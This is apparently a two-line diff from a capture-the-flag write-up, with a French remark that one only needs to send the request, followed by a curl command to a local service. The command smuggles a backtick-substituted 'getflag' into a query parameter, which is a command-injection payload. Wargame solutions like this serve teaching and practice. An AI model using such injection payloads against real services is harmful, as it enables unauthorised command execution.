@@ -1,0 +1,2 @@
+il suffit de faire la requete.
+curl localhost:4747?x=\`getflag\`
